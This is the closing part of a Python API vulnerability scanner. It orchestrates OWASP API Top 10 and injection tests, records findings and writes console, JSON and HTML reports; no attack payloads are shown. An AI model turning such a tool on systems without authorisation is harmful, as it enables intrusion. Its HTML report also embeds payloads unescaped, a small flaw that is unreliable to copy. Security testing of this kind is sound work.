                        if response.status_code in [200, 201]:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='API10:2023 - Unsafe Consumption of APIs',
                                severity='MEDIUM',
                                description=f'API accepts and may process data from external sources via parameter "{param}" without proper validation.',
                                payload=json.dumps(payload),
                                response_code=response.status_code,
                                evidence='API accepted external URL/callback without validation. This could allow attackers to inject malicious API responses or webhooks.',
                                remediation='Validate and sanitize data from external APIs. Use allowlists for external services. Implement certificate pinning. Validate redirect URLs. Treat third-party API responses with same scrutiny as user input.'
                            )
                            print(f"{Colors.YELLOW}[!] Unsafe API Consumption (API10:2023) in parameter: {param}{Colors.END}")
                            break
                    
                    except Exception:
                        pass

    def _add_finding(self, endpoint: str, method: str, vuln_type: str, severity: str,
                     description: str, payload: str, response_code: int, evidence: str, remediation: str):
        """Add a finding to the results"""
        finding = Finding(
            endpoint=endpoint,
            method=method,
            vulnerability_type=vuln_type,
            severity=severity,
            description=description,
            payload=payload,
            response_code=response_code,
            evidence=evidence,
            remediation=remediation,
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        )
        self.findings.append(finding)

    def run_full_scan(self, wordlist: List[str] = None):
        """Execute complete OWASP API Security Top 10 2023 vulnerability scan"""
        self.print_banner()
        
        # Phase 1: Discovery
        self.discover_endpoints(wordlist)
        
        if not self.endpoints:
            print(f"{Colors.RED}[!] No endpoints discovered. Exiting.{Colors.END}")
            return
        
        # Phase 2: Vulnerability Testing - OWASP API Security Top 10 2023
        print(f"\n{Colors.BOLD}[+] Phase 3: OWASP API Security Top 10 2023 Vulnerability Testing{Colors.END}")
        
        for endpoint_data in self.endpoints:
            print(f"\n{Colors.CYAN}[*] Testing: {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
            
            # Fuzz parameters
            params = self.fuzz_parameters(endpoint_data)
            
            if params:
                # Run OWASP API Security Top 10 2023 tests
                self.test_broken_object_level_authorization(endpoint_data, params)  # API1:2023
                # API2:2023 - Broken Authentication (tested separately)
                self.test_broken_object_property_authorization(endpoint_data, params)  # API3:2023
                # API4:2023 - Unrestricted Resource Consumption (tested separately)
                self.test_broken_function_level_authorization(endpoint_data)  # API5:2023
                # API6:2023 - Unrestricted Access to Sensitive Business Flows (requires business logic understanding)
                self.test_ssrf(endpoint_data, params)  # API7:2023
                # API8:2023 - Security Misconfiguration (tested separately)
                # API9:2023 - Improper Inventory Management (handled by discovery phase)
                self.test_unsafe_api_consumption(endpoint_data, params)  # API10:2023
                
                # Also test common web vulnerabilities that affect APIs
                self.test_sql_injection(endpoint_data, params)
                self.test_xss(endpoint_data, params)
                self.test_command_injection(endpoint_data, params)
                self.test_path_traversal(endpoint_data, params)
            
            # Test XXE regardless of parameters
            self.test_xxe(endpoint_data)
        
        # Phase 3: General API security tests
        self.test_security_headers()
        self.test_broken_authentication()
        self.test_unrestricted_resource_consumption()
        
        # Generate report
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive findings report"""
        print(f"\n{Colors.BOLD}{'='*100}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}                              VULNERABILITY ASSESSMENT REPORT{Colors.END}")
        print(f"{Colors.BOLD}{'='*100}{Colors.END}\n")
        
        if not self.findings:
            print(f"{Colors.GREEN}[+] No vulnerabilities detected!{Colors.END}\n")
            return
        
        # Sort findings by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x.severity, 999))
        
        # Summary statistics
        summary = {
            'CRITICAL': len([f for f in self.findings if f.severity == 'CRITICAL']),
            'HIGH': len([f for f in self.findings if f.severity == 'HIGH']),
            'MEDIUM': len([f for f in self.findings if f.severity == 'MEDIUM']),
            'LOW': len([f for f in self.findings if f.severity == 'LOW'])
        }
        
        print(f"{Colors.BOLD}EXECUTIVE SUMMARY{Colors.END}")
        print(f"{'─'*100}")
        print(f"Target: {self.base_url}")
        print(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Vulnerabilities: {len(self.findings)}")
        print(f"\n{Colors.RED}Critical: {summary['CRITICAL']}{Colors.END} | " +
              f"{Colors.YELLOW}High: {summary['HIGH']}{Colors.END} | " +
              f"{Colors.CYAN}Medium: {summary['MEDIUM']}{Colors.END} | " +
              f"{Colors.WHITE}Low: {summary['LOW']}{Colors.END}\n")
        
        # Detailed findings table
        print(f"{Colors.BOLD}DETAILED FINDINGS{Colors.END}")
        print(f"{'─'*100}")
        
        # Table header
        header = f"{'#':<4} {'SEVERITY':<10} {'TYPE':<30} {'ENDPOINT':<40} {'METHOD':<8}"
        print(f"{Colors.BOLD}{header}{Colors.END}")
        print(f"{'─'*100}")
        
        # Table rows
        for idx, finding in enumerate(sorted_findings, 1):
            severity_color = {
                'CRITICAL': Colors.RED,
                'HIGH': Colors.YELLOW,
                'MEDIUM': Colors.CYAN,
                'LOW': Colors.WHITE
            }.get(finding.severity, Colors.WHITE)
            
            row = f"{idx:<4} {severity_color}{finding.severity:<10}{Colors.END} " +\
                  f"{finding.vulnerability_type:<30} {finding.endpoint:<40} {finding.method:<8}"
            print(row)
        
        print(f"\n{'='*100}\n")
        
        # Detailed vulnerability information
        print(f"{Colors.BOLD}VULNERABILITY DETAILS{Colors.END}\n")
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_color = {
                'CRITICAL': Colors.RED,
                'HIGH': Colors.YELLOW,
                'MEDIUM': Colors.CYAN,
                'LOW': Colors.WHITE
            }.get(finding.severity, Colors.WHITE)
            
            print(f"{Colors.BOLD}[{idx}] {severity_color}{finding.severity}{Colors.END} - {Colors.BOLD}{finding.vulnerability_type}{Colors.END}")
            print(f"{'─'*100}")
            print(f"Endpoint:      {finding.method} {finding.endpoint}")
            print(f"Description:   {finding.description}")
            print(f"Evidence:      {finding.evidence}")
            print(f"Payload:       {finding.payload[:100]}{'...' if len(finding.payload) > 100 else ''}")
            print(f"HTTP Code:     {finding.response_code}")
            print(f"Timestamp:     {finding.timestamp}")
            print(f"\n{Colors.CYAN}Remediation:{Colors.END}")
            print(f"  {finding.remediation}")
            print(f"\n{'─'*100}\n")
        
        # Save to file
        self._save_report_to_file(sorted_findings, summary)

    def _save_report_to_file(self, sorted_findings: List[Finding], summary: Dict):
        """Save findings to JSON and HTML files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # JSON Report
        json_filename = f"/mnt/user-data/outputs/api_scan_{timestamp}.json"
        json_data = {
            'scan_info': {
                'target': self.base_url,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': len(self.findings)
            },
            'summary': summary,
            'findings': [asdict(f) for f in sorted_findings]
        }
        
        with open(json_filename, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # HTML Report
        html_filename = f"/mnt/user-data/outputs/api_scan_{timestamp}.html"
        html_content = self._generate_html_report(sorted_findings, summary)
        
        with open(html_filename, 'w') as f:
            f.write(html_content)
        
        print(f"{Colors.GREEN}[+] Reports saved:{Colors.END}")
        print(f"    JSON: {json_filename}")
        print(f"    HTML: {html_filename}\n")

    def _generate_html_report(self, sorted_findings: List[Finding], summary: Dict) -> str:
        """Generate HTML report"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>API Vulnerability Scan Report - Ghost Ops Security</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1400px; margin: 0 auto; background: white; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
        h2 {{ color: #34495e; margin-top: 30px; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; margin: -30px -30px 30px -30px; }}
        .summary {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .summary-box {{ padding: 20px; border-radius: 5px; text-align: center; flex: 1; margin: 0 10px; }}
        .critical {{ background: #e74c3c; color: white; }}
        .high {{ background: #e67e22; color: white; }}
        .medium {{ background: #f39c12; color: white; }}
        .low {{ background: #95a5a6; color: white; }}
        .summary-box h3 {{ margin: 0; font-size: 36px; }}
        .summary-box p {{ margin: 5px 0 0 0; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th {{ background: #34495e; color: white; padding: 12px; text-align: left; }}
        td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
        tr:hover {{ background: #f8f9fa; }}
        .vuln-detail {{ margin: 20px 0; padding: 20px; border-left: 4px solid #3498db; background: #ecf0f1; }}
        .severity-badge {{ padding: 5px 10px; border-radius: 3px; color: white; font-weight: bold; }}
        .code {{ background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px; overflow-x: auto; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ API Vulnerability Assessment Report</h1>
            <p><strong>Ghost Ops Security</strong></p>
            <p>Target: {self.base_url}</p>
            <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <h2>Executive Summary</h2>
        <div class="summary">
            <div class="summary-box critical">
                <h3>{summary['CRITICAL']}</h3>
                <p>Critical</p>
            </div>
            <div class="summary-box high">
                <h3>{summary['HIGH']}</h3>
                <p>High</p>
            </div>
            <div class="summary-box medium">
                <h3>{summary['MEDIUM']}</h3>
                <p>Medium</p>
            </div>
            <div class="summary-box low">
                <h3>{summary['LOW']}</h3>
                <p>Low</p>
            </div>
        </div>
        
        <h2>Findings Overview</h2>
        <table>
            <tr>
                <th>#</th>
                <th>Severity</th>
                <th>Vulnerability Type</th>
                <th>Endpoint</th>
                <th>Method</th>
            </tr>
"""
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_class = finding.severity.lower()
            html += f"""
            <tr>
                <td>{idx}</td>
                <td><span class="severity-badge {severity_class}">{finding.severity}</span></td>
                <td>{finding.vulnerability_type}</td>
                <td>{finding.endpoint}</td>
                <td>{finding.method}</td>
            </tr>
"""
        
        html += """
        </table>
        
        <h2>Detailed Findings</h2>
"""
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_class = finding.severity.lower()
            html += f"""
        <div class="vuln-detail">
            <h3>[{idx}] <span class="severity-badge {severity_class}">{finding.severity}</span> {finding.vulnerability_type}</h3>
            <p><strong>Endpoint:</strong> {finding.method} {finding.endpoint}</p>
            <p><strong>Description:</strong> {finding.description}</p>
            <p><strong>Evidence:</strong> {finding.evidence}</p>
            <p><strong>Payload:</strong></p>
            <div class="code">{finding.payload[:200]}{'...' if len(finding.payload) > 200 else ''}</div>
            <p><strong>HTTP Response Code:</strong> {finding.response_code}</p>
            <p><strong>Timestamp:</strong> {finding.timestamp}</p>
            <p><strong>Remediation:</strong> {finding.remediation}</p>
        </div>
"""
        
        html += """
    </div>
</body>
</html>
"""
        return html


def main():
    parser = argparse.ArgumentParser(
        description='API Vulnerability Scanner - Ghost Ops Security',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python api_vuln_scanner.py -u https://api.example.com
  python api_vuln_scanner.py -u https://api.example.com -H "Authorization: Bearer TOKEN" -t 20
  python api_vuln_scanner.py -u https://api.example.com -w endpoints.txt --proxy http://127.0.0.1:8080
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target API base URL')
    parser.add_argument('-H', '--header', action='append', help='Custom headers (can be used multiple times)')
    parser.add_argument('-w', '--wordlist', help='Custom endpoint wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    # Parse headers
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Parse proxy
    proxy = None
    if args.proxy:
        proxy = {
            'http': args.proxy,
            'https': args.proxy
        }
    
    # Load wordlist
    wordlist = None
    if args.wordlist:
        try:
            with open(args.wordlist, 'r') as f:
                wordlist = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading wordlist: {e}{Colors.END}")
            sys.exit(1)
    
    # Initialize and run scanner
    scanner = APIVulnScanner(
        base_url=args.url,
        headers=headers,
        proxy=proxy,
        threads=args.threads
    )
    
    try:
        scanner.run_full_scan(wordlist)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        if scanner.findings:
            scanner.generate_report()
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()
